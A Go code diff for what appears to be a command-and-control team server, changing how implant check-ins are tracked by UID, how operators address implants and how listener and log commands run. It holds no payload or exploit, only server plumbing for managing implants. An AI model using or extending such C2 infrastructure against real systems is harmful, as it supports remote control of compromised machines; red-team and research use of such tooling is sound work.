@@ -6,8 +6,8 @@ import (
 	"encoding/json"
 	"encoding/base64"
 	"io/ioutil"
-	"strconv"
 	"bytes"
+    "Team-Server/DB"
 )
 
 var uid string
@@ -15,6 +15,7 @@ var responseChan = make(chan string)
 
 
 func handleImplant(w http.ResponseWriter, r *http.Request) {
+    //update last seen time for the implant
 
     serializedData := r.Header.Get("Serialized-Data")
     uid = r.Header.Get("UID")
@@ -22,14 +23,16 @@ func handleImplant(w http.ResponseWriter, r *http.Request) {
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
     // Receive response
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-    var idMask int
+    var idMask string
 	if uid != "" {
-        // Check if the UID exists in the map
-        var ok bool
-        idMask, ok = ImplantMap[uid]
-        if !ok {
-            // UID not found in the map, call handleUID function
-            handleUID(uid)
+
+        connectionDetails, found := DB.ConnectionLog[uid]
+
+        if found {
+            idMask = connectionDetails.ImplantID
+        } else {
+            protocol := "http"
+            handleUID(uid, protocol)
             return
         }
 
@@ -101,11 +104,10 @@ func handleImplant(w http.ResponseWriter, r *http.Request) {
 func handleOperator(w http.ResponseWriter, r *http.Request) {
     // Only allow POST requests
     // operatorID := r.Header.Get("Operator-ID")
+    implantID := r.Header.Get("Implant-ID")
 
-    implantIDStr := r.Header.Get("Implant-ID")
-
-    implantID, err := strconv.Atoi(implantIDStr)
-    if err != nil {
+    //implantID, err := strconv.Atoi(implantIDStr)
+    if implantID == "" {
         // Handle error if conversion fails
         http.Error(w, "Invalid Implant-ID", http.StatusBadRequest)
         return
@@ -196,9 +198,9 @@ func handleServerCMDs(w http.ResponseWriter, r *http.Request) {
 
     switch cmdGroup {
     case "listener":
-        createListener(cmdString, respChan)
+        go createListener(cmdString, respChan)
     case "log":
-        updateConnections()
+        go updateConnections(respChan)
     default:
         fmt.Print(red)
         fmt.Println("Invalid command group. Valid command groups are 'shell' and 'implant'.")
